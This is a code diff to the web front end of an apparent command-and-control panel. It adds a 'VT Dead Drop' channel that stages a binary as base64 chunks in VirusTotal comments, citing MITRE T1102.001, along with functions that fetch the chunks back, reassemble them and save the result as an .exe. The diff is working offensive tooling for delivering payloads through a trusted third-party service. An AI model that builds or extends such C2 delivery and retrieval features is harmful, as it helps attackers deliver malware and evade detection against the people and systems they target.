@@ -1962,7 +1962,7 @@ code{font-family:var(--mono);font-size:12px;background:var(--bg4);padding:1px 5p
         <button class="btn btn-ghost" onclick="deliver('telegram')"><span>📨</span> Telegram</button>
         <button class="btn btn-ghost" onclick="deliver('github')"><span>🐙</span> GitHub Gist</button>
         <button class="btn btn-ghost" onclick="deliver('bitbucket')"><span>🪣</span> Bitbucket</button>
-        <button class="btn btn-ghost" onclick="deliver('virustotal')"><span>🦠</span> VirusTotal</button>
+        <button class="btn btn-ghost" onclick="deliver('virustotal')"><span>🦠</span> VT Dead Drop</button>
         <button class="btn btn-ghost" onclick="deliver('slack')"><span>💬</span> Slack</button>
       </div>
       <div id="deliver-output" class="terminal" style="margin-top:14px;min-height:80px;display:none"></div>
@@ -4857,8 +4857,53 @@ async function deliver(channel) {
   out.style.display = 'block';
   out.textContent = `delivering to ${channel}…`;
   const r = await fetch(`/api/c2/deliver/${channel}`, {method:'POST', headers:{'Content-Type':'application/json'}, body:'{}'}).then(r=>r.json()).catch(e=>({ok:false,error:String(e)}));
-  out.textContent = JSON.stringify(r, null, 2);
+  if (channel === 'virustotal' && r.ok) {
+    out.innerHTML =
+      `<span style="color:var(--green)">✓</span> Binary uploaded + staged as VT comments\n` +
+      `File    : ${escHtml(r.file||'')}  (${(r.size||0).toLocaleString()} bytes)\n` +
+      `SHA256  : <span style="color:var(--blue)">${escHtml(r.sha256||'')}</span>\n` +
+      `Chunks  : ${r.comments_posted}/${r.chunks} base64 comments posted\n` +
+      `Analysis: <a href="${escHtml(r.analysis_url||'')}" target="_blank" style="color:var(--blue)">${escHtml(r.analysis_id||'')}</a>\n` +
+      `MITRE   : ${escHtml(r.technique||'')} – Dead Drop Resolver\n\n` +
+      `<button class="btn btn-ghost btn-sm" onclick="retrieveVT('${r.sha256||''}')">🔽 Retrieve Binary</button>`;
+  } else {
+    out.textContent = JSON.stringify(r, null, 2);
+  }
   toast(r.ok ? `Delivered via ${channel}` : 'Delivery failed: ' + r.error, r.ok ? 'ok' : 'err');
+}
+
+async function retrieveVT(sha256) {
+  const out = document.getElementById('deliver-output');
+  out.innerHTML = `retrieving from VT comments (${escHtml(sha256.slice(0,16))}…)…`;
+  const r = await fetch('/api/c2/retrieve/virustotal', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({sha256}),
+  }).then(r=>r.json()).catch(e=>({ok:false,error:String(e)}));
+  if (r.ok) {
+    window._vtRetrievedB64  = r.payload_b64;
+    window._vtRetrievedName = `retrieved_${sha256.slice(0,8)}.exe`;
+    out.innerHTML =
+      `<span style="color:var(--green)">✓</span> Binary retrieved from VT dead drop\n` +
+      `SHA256  : <span style="color:var(--blue)">${escHtml(sha256)}</span>\n` +
+      `Size    : ${(r.size||0).toLocaleString()} bytes  (${r.chunks} chunks reassembled)\n` +
+      `MITRE   : T1102.001 – Dead Drop Resolver\n\n` +
+      `<button class="btn btn-ghost btn-sm" onclick="downloadRetrievedVT()">💾 Save Binary</button>`;
+  } else {
+    out.textContent = `retrieve failed: ${r.error||'unknown error'}\n${JSON.stringify(r,null,2)}`;
+  }
+  toast(r.ok ? 'Binary retrieved from VT dead drop' : 'Retrieve failed: ' + r.error, r.ok ? 'ok' : 'err');
+}
+
+function downloadRetrievedVT() {
+  if (!window._vtRetrievedB64) return;
+  const bytes = Uint8Array.from(atob(window._vtRetrievedB64), c => c.charCodeAt(0));
+  const blob  = new Blob([bytes], {type: 'application/octet-stream'});
+  const a     = document.createElement('a');
+  a.href      = URL.createObjectURL(blob);
+  a.download  = window._vtRetrievedName || 'retrieved.exe';
+  a.click();
+  URL.revokeObjectURL(a.href);
 }
 
 // -----------------------------------------------------------------
